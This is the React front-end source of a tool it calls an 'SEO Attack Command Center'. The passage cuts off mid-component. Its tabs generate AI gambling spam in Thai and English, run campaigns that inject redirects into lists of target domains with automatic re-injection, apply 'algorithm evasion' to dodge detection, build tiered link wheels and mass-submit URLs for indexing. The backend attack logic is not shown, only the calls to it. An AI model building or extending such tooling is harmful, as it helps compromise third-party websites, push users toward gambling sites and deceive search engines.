/**
 * SEO Spam V2 Dashboard — AI-Powered SEO Attack Command Center
 *
 * Features:
 * - AI Content Generator (gambling Thai/English)
 * - Keyword Intelligence (search volume, difficulty, expansion)
 * - Campaign Manager (multi-target orchestration)
 * - Link Wheel Builder (3-tier backlink system)
 * - Injection Monitor (check status + auto re-inject)
 * - Algorithm Evasion (anti-detection techniques)
 * - V2 Full Attack Chain (AI-powered end-to-end)
 * - Mass Indexing Engine
 */
import { useState, useCallback, useMemo } from "react";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Switch } from "@/components/ui/switch";
import { Label } from "@/components/ui/label";
import { Progress } from "@/components/ui/progress";
import {
  Brain, Zap, Globe, Target, Loader2, Search, Rocket, Copy,
  CheckCircle2, XCircle, Clock, Activity, FileText, Sparkles,
  TrendingUp, BarChart3, Link2, Shield, RefreshCw, Play,
  Trash2, Pause, AlertTriangle, Eye, ExternalLink, Download,
  Network, Cpu, Layers, ArrowRight, ChevronDown, ChevronUp,
  Hash, Crosshair, Flame, Syringe,
} from "lucide-react";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

interface GeneratedContent {
  title: string;
  metaDescription: string;
  h1: string;
  body: string;
  faq: { question: string; answer: string }[];
  schemaMarkup: string;
  wordCount: number;
  language: "th" | "en";
  keywords: string[];
}

interface GamblingKeyword {
  keyword: string;
  searchVolume: number;
  difficulty: number;
  cpc: number;
  intent: string;
  language: string;
  category: string;
  relatedKeywords: string[];
  longTailVariants: string[];
  serpFeatures: string[];
}

// ═══════════════════════════════════════════════════════
//  COMPONENT
// ═══════════════════════════════════════════════════════

export default function SeoSpamV2Dashboard() {
  const [activeTab, setActiveTab] = useState("content");

  // ─── Content Generator State ───
  const [contentKeyword, setContentKeyword] = useState("");
  const [contentRedirectUrl, setContentRedirectUrl] = useState("");
  const [contentLanguage, setContentLanguage] = useState<"th" | "en">("th");
  const [contentStyle, setContentStyle] = useState<"gambling" | "crypto" | "mixed">("gambling");
  const [contentWordCount, setContentWordCount] = useState(1500);
  const [includeFaq, setIncludeFaq] = useState(true);
  const [includeSchema, setIncludeSchema] = useState(true);
  const [humanize, setHumanize] = useState(true);
  const [generatedContent, setGeneratedContent] = useState<any>(null);

  // ─── Keyword Intelligence State ───
  const [kwCategory, setKwCategory] = useState("");
  const [kwLanguage, setKwLanguage] = useState<"th" | "en">("th");
  const [kwSeedKeyword, setKwSeedKeyword] = useState("");
  const [expandedKeywords, setExpandedKeywords] = useState<string[]>([]);

  // ─── Campaign Manager State ───
  const [campaignName, setCampaignName] = useState("");
  const [campaignTargets, setCampaignTargets] = useState("");
  const [campaignRedirectUrl, setCampaignRedirectUrl] = useState("");

  // ─── Link Wheel State ───
  const [lwMoneySite, setLwMoneySite] = useState("");
  const [lwKeywords, setLwKeywords] = useState("");
  const [lwTiers, setLwTiers] = useState<1 | 2 | 3>(3);
  const [linkWheelResult, setLinkWheelResult] = useState<any>(null);

  // ─── Injection Monitor State ───
  const [monitorUrl, setMonitorUrl] = useState("");
  const [monitorRedirectUrl, setMonitorRedirectUrl] = useState("");

  // ─── V2 Attack Chain State ───
  const [v2Target, setV2Target] = useState("");
  const [v2RedirectUrl, setV2RedirectUrl] = useState("");
  const [v2Keywords, setV2Keywords] = useState("");
  const [v2Language, setV2Language] = useState<"th" | "en">("th");
  const [v2EnableBacklinks, setV2EnableBacklinks] = useState(true);
  const [v2EnableIndexing, setV2EnableIndexing] = useState(true);

  // ─── Mass Indexing State ───
  const [indexUrls, setIndexUrls] = useState("");
  const [indexMethod, setIndexMethod] = useState<"api" | "ping" | "sitemap" | "all">("all");

  // ═══════════════════════════════════════════════════════
  //  tRPC MUTATIONS & QUERIES
  // ═══════════════════════════════════════════════════════

  const generateContentMut = trpc.seoSpamV2.generateContent.useMutation({
    onSuccess: (data) => {
      setGeneratedContent(data);
      toast.success(`Content generated: ${data.wordCount} words`);
    },
    onError: (err) => toast.error(err.message),
  });

  const batchGenerateMut = trpc.seoSpamV2.batchGenerateContent.useMutation({
    onSuccess: (data) => {
      toast.success(`Batch: ${data.totalGenerated} generated, ${data.totalFailed} failed`);
    },
    onError: (err) => toast.error(err.message),
  });

  const keywordsQuery = trpc.seoSpamV2.getKeywords.useQuery(
    { category: kwCategory || undefined, language: kwLanguage, limit: 50 },
    { enabled: true, staleTime: 60_000 }
  );

  const expandKeywordsMut = trpc.seoSpamV2.expandKeywords.useMutation({
    onSuccess: (data) => {
      setExpandedKeywords(data.expandedKeywords);
      toast.success(`Expanded: ${data.count} keywords`);
    },
    onError: (err) => toast.error(err.message),
  });

  const generateLinkWheelMut = trpc.seoSpamV2.generateLinkWheel.useMutation({
    onSuccess: (data) => {
      setLinkWheelResult(data);
      toast.success(`Link wheel: ${data.totalLinks} links across ${data.tiers} tiers`);
    },
    onError: (err) => toast.error(err.message),
  });

  const generateAnchorsMut = trpc.seoSpamV2.generateAnchors.useMutation({
    onSuccess: (data) => {
      toast.success(`Generated ${data.total} anchor texts`);
    },
    onError: (err) => toast.error(err.message),
  });

  const massIndexMut = trpc.seoSpamV2.massIndex.useMutation({
    onSuccess: (data) => {
      toast.success(`Indexed: ${data.submitted}/${data.submitted + data.failed} URLs`);
    },
    onError: (err) => toast.error(err.message),
  });

  const checkInjectionMut = trpc.seoSpamV2.checkInjection.useMutation({
    onSuccess: (data) => {
      toast.success(`Status: ${data.status} | Indexed: ${data.indexedByGoogle ? "Yes" : "No"}`);
    },
    onError: (err) => toast.error(err.message),
  });

  const createCampaignMut = trpc.seoSpamV2.createCampaign.useMutation({
    onSuccess: (data) => {
      toast.success(`Campaign "${data.name}" created`);
      campaignsQuery.refetch();
    },
    onError: (err) => toast.error(err.message),
  });

  const campaignsQuery = trpc.seoSpamV2.getAllCampaigns.useQuery(undefined, {
    staleTime: 30_000,
  });

  const deleteCampaignMut = trpc.seoSpamV2.deleteCampaign.useMutation({
    onSuccess: () => {
      toast.success("Campaign deleted");
      campaignsQuery.refetch();
    },
    onError: (err) => toast.error(err.message),
  });

  const evasionQuery = trpc.seoSpamV2.getEvasionTechniques.useQuery(
    { category: undefined },
    { staleTime: 120_000 }
  );

  const wrapEvasionMut = trpc.seoSpamV2.wrapWithEvasion.useMutation({
    onSuccess: (data) => {
      toast.success(`Wrapped: ${data.wrappedLength} chars (${data.techniquesApplied.length} techniques)`);
    },
    onError: (err) => toast.error(err.message),
  });

  const runV2ChainMut = trpc.seoSpamV2.runV2Chain.useMutation({
    onSuccess: (data) => {
      toast.success(`V2 Chain complete in ${(data.elapsed / 1000).toFixed(1)}s`);
    },
    onError: (err) => toast.error(err.message),
  });

  // ═══════════════════════════════════════════════════════
  //  HELPERS
  // ═══════════════════════════════════════════════════════

  const copyToClipboard = useCallback((text: string) => {
    navigator.clipboard.writeText(text);
    toast.success("Copied!");
  }, []);

  const isRunning = generateContentMut.isPending || batchGenerateMut.isPending
    || expandKeywordsMut.isPending || generateLinkWheelMut.isPending
    || massIndexMut.isPending || checkInjectionMut.isPending
    || createCampaignMut.isPending || runV2ChainMut.isPending
    || wrapEvasionMut.isPending || generateAnchorsMut.isPending;

  // ═══════════════════════════════════════════════════════
  //  RENDER
  // ═══════════════════════════════════════════════════════

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="relative overflow-hidden rounded-xl border border-violet-500/20 bg-gradient-to-br from-violet-950/40 via-black to-fuchsia-950/30 p-6">
        <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_top_right,rgba(139,92,246,0.1),transparent_60%)]" />
        <div className="relative flex items-center gap-4">
          <div className="flex h-14 w-14 items-center justify-center rounded-xl bg-violet-500/20 border border-violet-500/30">
            <Brain className="h-7 w-7 text-violet-400" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h1 className="text-2xl font-bold text-white">SEO SPAM V2</h1>
              <Badge variant="outline" className="border-violet-500/50 text-violet-400 text-xs">AI-POWERED</Badge>
              <Badge variant="outline" className="border-fuchsia-500/50 text-fuchsia-400 text-xs">ADVANCED</Badge>
            </div>
            <p className="text-sm text-gray-400 mt-1">
              AI Content Generator + Keyword Intelligence + Tiered Backlinks + Campaign Manager + Algorithm Evasion
            </p>
          </div>
        </div>
      </div>

      {/* Main Tabs */}
      <Tabs value={activeTab} onValueChange={setActiveTab}>
        <TabsList className="bg-gray-900/50 border border-gray-800 flex-wrap h-auto gap-1 p-1">
          <TabsTrigger value="content" className="text-xs gap-1"><Sparkles className="h-3 w-3" /> AI Content</TabsTrigger>
          <TabsTrigger value="keywords" className="text-xs gap-1"><Search className="h-3 w-3" /> Keywords</TabsTrigger>
          <TabsTrigger value="campaigns" className="text-xs gap-1"><Target className="h-3 w-3" /> Campaigns</TabsTrigger>
          <TabsTrigger value="backlinks" className="text-xs gap-1"><Link2 className="h-3 w-3" /> Link Wheel</TabsTrigger>
          <TabsTrigger value="monitor" className="text-xs gap-1"><Eye className="h-3 w-3" /> Monitor</TabsTrigger>
          <TabsTrigger value="evasion" className="text-xs gap-1"><Shield className="h-3 w-3" /> Evasion</TabsTrigger>
          <TabsTrigger value="indexing" className="text-xs gap-1"><Globe className="h-3 w-3" /> Indexing</TabsTrigger>
          <TabsTrigger value="v2chain" className="text-xs gap-1"><Rocket className="h-3 w-3" /> V2 Chain</TabsTrigger>
        </TabsList>

        {/* ═══════════ AI CONTENT GENERATOR ═══════════ */}
        <TabsContent value="content" className="space-y-4">
          <Card className="border-gray-800 bg-gray-900/50">
            <CardHeader>
              <CardTitle className="text-lg flex items-center gap-2">
                <Sparkles className="h-5 w-5 text-violet-400" /> AI Gambling Content Generator
              </CardTitle>
              <CardDescription>สร้างเนื้อหาการพนัน SEO-optimized ด้วย AI อัตโนมัติ</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid gap-4 md:grid-cols-2">
                <div>
                  <Label className="text-xs text-gray-400">Target Keyword</Label>
                  <Input value={contentKeyword} onChange={(e) => setContentKeyword(e.target.value)}
                    placeholder="เว็บพนันออนไลน์, casino online" className="bg-gray-800/50 border-gray-700 mt-1" />
                </div>
                <div>
                  <Label className="text-xs text-gray-400">Redirect URL</Label>
                  <Input value={contentRedirectUrl} onChange={(e) => setContentRedirectUrl(e.target.value)}
                    placeholder="https://your-casino.com" className="bg-gray-800/50 border-gray-700 mt-1" />
                </div>
              </div>

              <div className="grid gap-4 md:grid-cols-4">
                <div>
                  <Label className="text-xs text-gray-400">Language</Label>
                  <div className="flex gap-2 mt-1">
                    {(["th", "en"] as const).map(lang => (
                      <button key={lang} onClick={() => setContentLanguage(lang)}
                        className={`px-3 py-1.5 rounded-md text-xs font-medium transition-all ${
                          contentLanguage === lang
                            ? "bg-violet-600 text-white ring-1 ring-violet-400"
                            : "bg-gray-800/50 text-gray-400 hover:bg-gray-700/50 border border-gray-700"
                        }`}>
                        {lang === "th" ? "ไทย" : "English"}
                      </button>
                    ))}
                  </div>
                </div>
                <div>
                  <Label className="text-xs text-gray-400">Content Style</Label>
                  <div className="flex gap-2 mt-1">
                    {(["gambling", "crypto", "mixed"] as const).map(style => (
                      <button key={style} onClick={() => setContentStyle(style)}
                        className={`px-3 py-1.5 rounded-md text-xs font-medium transition-all capitalize ${
                          contentStyle === style
                            ? "bg-fuchsia-600 text-white ring-1 ring-fuchsia-400"
                            : "bg-gray-800/50 text-gray-400 hover:bg-gray-700/50 border border-gray-700"
                        }`}>
                        {style}
                      </button>
                    ))}
                  </div>
                </div>
                <div>
                  <Label className="text-xs text-gray-400">Word Count</Label>
                  <Input type="number" min={300} max={5000} value={contentWordCount}
                    onChange={(e) => setContentWordCount(Number(e.target.value))}
                    className="bg-gray-800/50 border-gray-700 mt-1" />
                </div>
                <div className="space-y-2">
                  <div className="flex items-center gap-2">
                    <Switch checked={includeFaq} onCheckedChange={setIncludeFaq} />
                    <Label className="text-xs text-gray-400">FAQ Section</Label>
                  </div>
                  <div className="flex items-center gap-2">
                    <Switch checked={includeSchema} onCheckedChange={setIncludeSchema} />
                    <Label className="text-xs text-gray-400">Schema Markup</Label>
                  </div>
                  <div className="flex items-center gap-2">
                    <Switch checked={humanize} onCheckedChange={setHumanize} />
                    <Label className="text-xs text-gray-400">Humanize</Label>
                  </div>
                </div>
              </div>

              <Button onClick={() => {
                if (!contentKeyword.trim()) return toast.error("ใส่ keyword ก่อน");
                if (!contentRedirectUrl.trim()) return toast.error("ใส่ redirect URL ก่อน");
                generateContentMut.mutate({
                  keyword: contentKeyword.trim(),
                  redirectUrl: contentRedirectUrl.trim(),
                  language: contentLanguage,
                  contentStyle,
                  wordCount: contentWordCount,
                  includeFaq,
                  includeSchema,
                  includeInternalLinks: true,
                  humanize,
                });
              }} disabled={isRunning}
                className="bg-gradient-to-r from-violet-600 to-fuchsia-600 hover:from-violet-700 hover:to-fuchsia-700 text-white font-bold">
                {generateContentMut.isPending
                  ? <><Loader2 className="h-4 w-4 animate-spin mr-2" /> Generating...</>
                  : <><Brain className="h-4 w-4 mr-2" /> Generate AI Content</>}
              </Button>

              {/* Generated Content Preview */}
              {generatedContent && (
                <Card className="border-violet-500/20 bg-violet-950/10">
                  <CardHeader className="pb-3">
                    <div className="flex items-center justify-between">
                      <CardTitle className="text-sm flex items-center gap-2">
                        <FileText className="h-4 w-4 text-violet-400" /> Generated Content
                        <Badge variant="outline" className="text-[10px]">{generatedContent.wordCount} words</Badge>
                        <Badge variant="outline" className="text-[10px]">{generatedContent.language === "th" ? "ไทย" : "EN"}</Badge>
                      </CardTitle>
                      <div className="flex gap-1">
                        <Button variant="ghost" size="sm" onClick={() => copyToClipboard(generatedContent.body)}>
                          <Copy className="h-3 w-3" />
                        </Button>
                        <Button variant="ghost" size="sm" onClick={() => {
                          const blob = new Blob([JSON.stringify(generatedContent, null, 2)], { type: "application/json" });
                          const url = URL.createObjectURL(blob);
                          const a = document.createElement("a"); a.href = url; a.download = "seo-content.json"; a.click();
                        }}>
                          <Download className="h-3 w-3" />
                        </Button>
                      </div>
                    </div>
                  </CardHeader>
                  <CardContent className="space-y-3">
                    <div className="grid grid-cols-2 gap-3">
                      <div className="p-3 rounded-lg bg-gray-800/50 border border-gray-700/50">
                        <p className="text-[10px] text-gray-500 uppercase">Title</p>
                        <p className="text-sm text-white mt-1">{generatedContent.title}</p>
                      </div>
                      <div className="p-3 rounded-lg bg-gray-800/50 border border-gray-700/50">
                        <p className="text-[10px] text-gray-500 uppercase">H1</p>
                        <p className="text-sm text-white mt-1">{generatedContent.h1}</p>
                      </div>
                    </div>
                    <div className="p-3 rounded-lg bg-gray-800/50 border border-gray-700/50">
                      <p className="text-[10px] text-gray-500 uppercase">Meta Description</p>
                      <p className="text-xs text-gray-300 mt-1">{generatedContent.metaDescription}</p>
                    </div>
                    <div className="p-3 rounded-lg bg-gray-800/50 border border-gray-700/50">
                      <p className="text-[10px] text-gray-500 uppercase">Body Preview</p>
                      <ScrollArea className="max-h-[200px] mt-1">
                        <div className="text-xs text-gray-300 whitespace-pre-wrap">{generatedContent.body.slice(0, 2000)}{generatedContent.body.length > 2000 ? "..." : ""}</div>
                      </ScrollArea>
                    </div>
                    {generatedContent.faq?.length > 0 && (
                      <div className="p-3 rounded-lg bg-gray-800/50 border border-gray-700/50">
                        <p className="text-[10px] text-gray-500 uppercase mb-2">FAQ ({generatedContent.faq.length} items)</p>
                        <div className="space-y-2">
                          {generatedContent.faq.map((f: any, i: number) => (
                            <div key={i} className="p-2 rounded bg-gray-900/50 border border-gray-700/30">
                              <p className="text-xs font-medium text-violet-300">{f.question}</p>
                              <p className="text-[10px] text-gray-400 mt-1">{f.answer}</p>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}
                    {generatedContent.keywords?.length > 0 && (
                      <div className="flex flex-wrap gap-1">
                        {generatedContent.keywords.map((kw: string, i: number) => (
                          <Badge key={i} variant="outline" className="text-[9px] text-violet-300 border-violet-500/30">{kw}</Badge>
                        ))}
                      </div>
                    )}
                  </CardContent>
                </Card>
              )}
            </CardContent>
          </Card>
        </TabsContent>

        {/* ═══════════ KEYWORD INTELLIGENCE ═══════════ */}
        <TabsContent value="keywords" className="space-y-4">
          <div className="grid gap-4 lg:grid-cols-2">
            {/* Keyword Database */}
            <Card className="border-gray-800 bg-gray-900/50">
              <CardHeader>
                <CardTitle className="text-sm flex items-center gap-2">
                  <Search className="h-4 w-4 text-amber-400" /> Gambling Keyword Database
                </CardTitle>
                <CardDescription>ฐานข้อมูล keyword การพนันพร้อม search volume</CardDescription>
              </CardHeader>
              <CardContent className="space-y-3">
                <div className="flex gap-2">
                  <div className="flex gap-1 flex-wrap">
                    {["", "casino", "slots", "sports", "poker", "lottery", "crypto"].map(cat => (
                      <button key={cat} onClick={() => setKwCategory(cat)}
                        className={`px-2 py-1 rounded text-[10px] font-medium transition-all capitalize ${
                          kwCategory === cat
                            ? "bg-amber-600 text-white"
                            : "bg-gray-800/50 text-gray-400 hover:bg-gray-700/50 border border-gray-700"
                        }`}>
                        {cat || "All"}
                      </button>
                    ))}
                  </div>
                </div>

                <ScrollArea className="max-h-[400px]">
                  <div className="space-y-1">
                    {keywordsQuery.data?.keywords?.map((kw: GamblingKeyword, i: number) => (
                      <div key={i} className="flex items-center gap-2 p-2 rounded-lg bg-gray-800/30 border border-gray-700/30 hover:border-gray-600/50 transition-colors group">
                        <div className="flex-1 min-w-0">
                          <p className="text-xs font-medium text-white truncate">{kw.keyword}</p>
                          <div className="flex items-center gap-2 mt-0.5">
                            <span className="text-[10px] text-gray-500">Vol: {kw.searchVolume.toLocaleString()}</span>
                            <span className="text-[10px] text-gray-500">Diff: {kw.difficulty}</span>
                            <Badge variant="outline" className="text-[8px] h-4">{kw.category}</Badge>
                          </div>
                        </div>
                        <div className="flex items-center gap-1">
                          <div className={`w-2 h-2 rounded-full ${
                            kw.difficulty < 30 ? "bg-green-400" : kw.difficulty < 60 ? "bg-yellow-400" : "bg-red-400"
                          }`} />
                          <button onClick={() => {
                            setContentKeyword(kw.keyword);
                            setActiveTab("content");
                            toast.info(`Keyword "${kw.keyword}" selected`);
                          }} className="opacity-0 group-hover:opacity-100 transition-opacity p-1 rounded hover:bg-gray-700">
                            <Play className="h-3 w-3 text-violet-400" />
                          </button>
                        </div>
                      </div>
                    )) || (
                      <div className="text-center py-8 text-gray-500 text-xs">
                        <Search className="h-6 w-6 mx-auto mb-2 opacity-30" />
                        Loading keywords...
                      </div>
                    )}
                  </div>
                </ScrollArea>

                {keywordsQuery.data && (
                  <div className="flex items-center justify-between text-[10px] text-gray-500 pt-2 border-t border-gray-800">
                    <span>{keywordsQuery.data.total} keywords</span>
                    <span>Avg Vol: {keywordsQuery.data.avgVolume?.toLocaleString()} | Avg Diff: {keywordsQuery.data.avgDifficulty}</span>
                  </div>
                )}
              </CardContent>
            </Card>

            {/* Keyword Expansion */}
            <Card className="border-gray-800 bg-gray-900/50">
              <CardHeader>
                <CardTitle className="text-sm flex items-center gap-2">
                  <TrendingUp className="h-4 w-4 text-emerald-400" /> AI Keyword Expansion
                </CardTitle>
                <CardDescription>ขยาย keyword ด้วย AI เพื่อค้นหาโอกาสใหม่</CardDescription>
              </CardHeader>
              <CardContent className="space-y-3">
                <div className="flex gap-2">
                  <Input value={kwSeedKeyword} onChange={(e) => setKwSeedKeyword(e.target.value)}
                    placeholder="Seed keyword (e.g., คาสิโน)" className="bg-gray-800/50 border-gray-700" />
                  <Button onClick={() => {
                    if (!kwSeedKeyword.trim()) return toast.error("ใส่ seed keyword ก่อน");
                    expandKeywordsMut.mutate({ seedKeyword: kwSeedKeyword.trim(), language: kwLanguage, count: 20 });
                  }} disabled={isRunning} className="bg-emerald-600 hover:bg-emerald-700 shrink-0">
                    {expandKeywordsMut.isPending
                      ? <Loader2 className="h-4 w-4 animate-spin" />
                      : <Zap className="h-4 w-4" />}
                  </Button>
                </div>

                {expandedKeywords.length > 0 && (
                  <div className="space-y-1">
                    <p className="text-[10px] text-gray-500 uppercase">Expanded Keywords ({expandedKeywords.length})</p>
                    <ScrollArea className="max-h-[300px]">
                      <div className="flex flex-wrap gap-1.5">
                        {expandedKeywords.map((kw, i) => (
                          <Badge key={i} variant="outline"
                            className="text-xs text-emerald-300 border-emerald-500/30 cursor-pointer hover:bg-emerald-500/10"
                            onClick={() => {
                              setContentKeyword(kw);
                              setActiveTab("content");
                              toast.info(`Selected: ${kw}`);
                            }}>
                            {kw}
                          </Badge>
                        ))}
                      </div>
                    </ScrollArea>
                    <Button variant="outline" size="sm" onClick={() => copyToClipboard(expandedKeywords.join("\n"))}
                      className="text-xs border-gray-700">
                      <Copy className="h-3 w-3 mr-1" /> Copy All
                    </Button>
                  </div>
                )}

                {expandKeywordsMut.data && (
                  <div className="p-3 rounded-lg bg-emerald-950/20 border border-emerald-500/20">
                    <p className="text-xs text-emerald-300">
                      Seed: <span className="font-bold">{expandKeywordsMut.data.seedKeyword}</span>
                      {" "} expanded to {expandKeywordsMut.data.count} keywords
                    </p>
                  </div>
                )}
              </CardContent>
            </Card>
          </div>
        </TabsContent>

        {/* ═══════════ CAMPAIGN MANAGER ═══════════ */}
        <TabsContent value="campaigns" className="space-y-4">
          {/* Create Campaign */}
          <Card className="border-gray-800 bg-gray-900/50">
            <CardHeader>
              <CardTitle className="text-sm flex items-center gap-2">
                <Target className="h-4 w-4 text-red-400" /> Create Campaign
              </CardTitle>
              <CardDescription>สร้าง campaign จัดการหลาย target พร้อมกัน</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid gap-4 md:grid-cols-3">
                <div>
                  <Label className="text-xs text-gray-400">Campaign Name</Label>
                  <Input value={campaignName} onChange={(e) => setCampaignName(e.target.value)}
                    placeholder="My Campaign" className="bg-gray-800/50 border-gray-700 mt-1" />
                </div>
                <div>
                  <Label className="text-xs text-gray-400">Redirect URL</Label>
                  <Input value={campaignRedirectUrl} onChange={(e) => setCampaignRedirectUrl(e.target.value)}
                    placeholder="https://your-casino.com" className="bg-gray-800/50 border-gray-700 mt-1" />
                </div>
                <div>
                  <Label className="text-xs text-gray-400">Target Domains (one per line)</Label>
                  <textarea value={campaignTargets} onChange={(e) => setCampaignTargets(e.target.value)}
                    placeholder="target1.com&#10;target2.com&#10;target3.com" rows={3}
                    className="w-full rounded-md bg-gray-800/50 border border-gray-700 text-sm px-3 py-2 text-gray-200 placeholder:text-gray-600 mt-1" />
                </div>
              </div>
              <Button onClick={() => {
                if (!campaignName.trim()) return toast.error("ใส่ชื่อ campaign");
                if (!campaignRedirectUrl.trim()) return toast.error("ใส่ redirect URL");
                const targets = campaignTargets.split("\n").map(t => t.trim()).filter(Boolean);
                if (targets.length === 0) return toast.error("ใส่ target domains");
                createCampaignMut.mutate({
                  name: campaignName.trim(),
                  targetDomains: targets,
                  redirectUrl: campaignRedirectUrl.trim(),
                  config: {
                    autoReinjection: true,
                    enableAiContent: true,
                    enableBacklinks: true,
                    enableIndexing: true,
                    contentLanguage: "th",
                  },
                });
              }} disabled={isRunning} className="bg-red-600 hover:bg-red-700">
                {createCampaignMut.isPending
                  ? <><Loader2 className="h-4 w-4 animate-spin mr-2" /> Creating...</>
                  : <><Target className="h-4 w-4 mr-2" /> Create Campaign</>}
              </Button>
            </CardContent>
          </Card>

          {/* Campaign List */}
          <Card className="border-gray-800 bg-gray-900/50">
            <CardHeader>
              <div className="flex items-center justify-between">
                <CardTitle className="text-sm flex items-center gap-2">
                  <Activity className="h-4 w-4 text-cyan-400" /> Active Campaigns
                  {campaignsQuery.data && (
                    <Badge variant="outline" className="text-[10px]">
                      {campaignsQuery.data.running} running / {campaignsQuery.data.total} total
                    </Badge>
                  )}
                </CardTitle>
                <Button variant="ghost" size="sm" onClick={() => campaignsQuery.refetch()}>
                  <RefreshCw className={`h-3 w-3 ${campaignsQuery.isFetching ? "animate-spin" : ""}`} />
                </Button>
              </div>
            </CardHeader>
            <CardContent>
              <ScrollArea className="max-h-[400px]">
                <div className="space-y-2">
                  {campaignsQuery.data?.campaigns?.map((campaign: any) => (
                    <div key={campaign.id} className="p-3 rounded-lg bg-gray-800/30 border border-gray-700/30 hover:border-gray-600/50 transition-colors">
                      <div className="flex items-center justify-between mb-2">
                        <div className="flex items-center gap-2">
                          <h3 className="text-sm font-medium text-white">{campaign.name}</h3>
                          <Badge variant="outline" className={`text-[10px] ${
                            campaign.status === "running" ? "text-green-400 border-green-500/30" :
                            campaign.status === "completed" ? "text-blue-400 border-blue-500/30" :
                            campaign.status === "paused" ? "text-yellow-400 border-yellow-500/30" :
                            campaign.status === "failed" ? "text-red-400 border-red-500/30" :
                            "text-gray-400 border-gray-500/30"
                          }`}>
                            {campaign.status}
                          </Badge>
                        </div>
                        <div className="flex gap-1">
                          <Button variant="ghost" size="sm" className="h-7 w-7 p-0"
                            onClick={() => deleteCampaignMut.mutate({ id: campaign.id })}>
                            <Trash2 className="h-3 w-3 text-red-400" />
                          </Button>
                        </div>
                      </div>
                      <div className="flex items-center gap-4 text-[10px] text-gray-500">
                        <span>{campaign.targetDomains?.length || 0} targets</span>
                        <span>{campaign.redirectUrl}</span>
                        <span>{new Date(campaign.createdAt).toLocaleDateString()}</span>
                      </div>
                      {campaign.progress > 0 && (
                        <Progress value={campaign.progress} className="h-1 mt-2" />
                      )}
                    </div>
                  )) || (
                    <div className="text-center py-8 text-gray-500 text-xs">
                      No campaigns yet
                    </div>
                  )}
                </div>
              </ScrollArea>
            </CardContent>
          </Card>
        </TabsContent>

        {/* ═══════════ LINK WHEEL BUILDER ═══════════ */}
        <TabsContent value="backlinks" className="space-y-4">
          <Card className="border-gray-800 bg-gray-900/50">
            <CardHeader>
              <CardTitle className="text-sm flex items-center gap-2">
                <Network className="h-4 w-4 text-blue-400" /> Tiered Link Wheel Builder
              </CardTitle>
              <CardDescription>สร้าง link wheel 3 ชั้นเพื่อเพิ่ม authority</CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid gap-4 md:grid-cols-3">
                <div>
                  <Label className="text-xs text-gray-400">Money Site URL</Label>
                  <Input value={lwMoneySite} onChange={(e) => setLwMoneySite(e.target.value)}
                    placeholder="https://your-casino.com" className="bg-gray-800/50 border-gray-700 mt-1" />
                </div>
                <div>
                  <Label className="text-xs text-gray-400">Keywords (comma separated)</Label>
                  <Input value={lwKeywords} onChange={(e) => setLwKeywords(e.target.value)}
                    placeholder="casino, slots, betting" className="bg-gray-800/50 border-gray-700 mt-1" />
                </div>
                <div>
                  <Label className="text-xs text-gray-400">Tiers</Label>
                  <div className="flex gap-2 mt-1">
                    {([1, 2, 3] as const).map(tier => (
                      <button key={tier} onClick={() => setLwTiers(tier)}
                        className={`px-3 py-1.5 rounded-md text-xs font-medium transition-all ${
                          lwTiers === tier
                            ? "bg-blue-600 text-white ring-1 ring-blue-400"
                            : "bg-gray-800/50 text-gray-400 hover:bg-gray-700/50 border border-gray-700"
                        }`}>
                        {tier} Tier{tier > 1 ? "s" : ""}
                      </button>
                    ))}
                  </div>
                </div>
              </div>

              <Button onClick={() => {
                if (!lwMoneySite.trim()) return toast.error("ใส่ Money Site URL");
                const keywords = lwKeywords.split(",").map(k => k.trim()).filter(Boolean);
                if (keywords.length === 0) return toast.error("ใส่ keywords");
                generateLinkWheelMut.mutate({ moneySiteUrl: lwMoneySite.trim(), keywords, tiers: lwTiers });
              }} disabled={isRunning} className="bg-blue-600 hover:bg-blue-700">
                {generateLinkWheelMut.isPending
                  ? <><Loader2 className="h-4 w-4 animate-spin mr-2" /> Building...</>
                  : <><Network className="h-4 w-4 mr-2" /> Build Link Wheel</>}
              </Button>

              {/* Link Wheel Visualization */}
              {linkWheelResult && (
                <Card className="border-blue-500/20 bg-blue-950/10">
                  <CardHeader className="pb-3">
                    <CardTitle className="text-sm flex items-center gap-2">
                      <Layers className="h-4 w-4 text-blue-400" /> Link Wheel Result
                      <Badge variant="outline" className="text-[10px]">{linkWheelResult.totalLinks} links</Badge>
                      <Badge variant="outline" className="text-[10px]">{linkWheelResult.tiers} tiers</Badge>
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-3">
                    <div className="p-3 rounded-lg bg-gray-800/50 border border-gray-700/50">
                      <p className="text-[10px] text-gray-500 uppercase">Money Site</p>
                      <p className="text-sm text-blue-400 mt-1">{linkWheelResult.moneySiteUrl}</p>
                    </div>

                    {linkWheelResult.tierData?.map((tier: any, ti: number) => (
                      <div key={ti} className="p-3 rounded-lg bg-gray-800/30 border border-gray-700/30">
                        <div className="flex items-center gap-2 mb-2">
                          <Badge variant="outline" className={`text-[10px] ${
                            ti === 0 ? "text-green-400 border-green-500/30" :
                            ti === 1 ? "text-yellow-400 border-yellow-500/30" :
                            "text-orange-400 border-orange-500/30"
                          }`}>
                            Tier {ti + 1}
                          </Badge>
                          <span className="text-[10px] text-gray-500">{tier.links?.length || 0} links</span>
                          <span className="text-[10px] text-gray-500">{tier.type}</span>
                        </div>
                        <ScrollArea className="max-h-[150px]">
                          <div className="space-y-1">
                            {tier.links?.map((link: any, li: number) => (
                              <div key={li} className="flex items-center gap-2 text-[10px] p-1 rounded bg-gray-900/50">
                                <ArrowRight className="h-3 w-3 text-gray-600 shrink-0" />
                                <span className="text-gray-400 truncate">{link.from}</span>
                                <ArrowRight className="h-3 w-3 text-blue-400 shrink-0" />
                                <span className="text-blue-300 truncate">{link.to}</span>
                                <Badge variant="outline" className="text-[8px] ml-auto shrink-0">{link.anchor}</Badge>
                              </div>
                            ))}
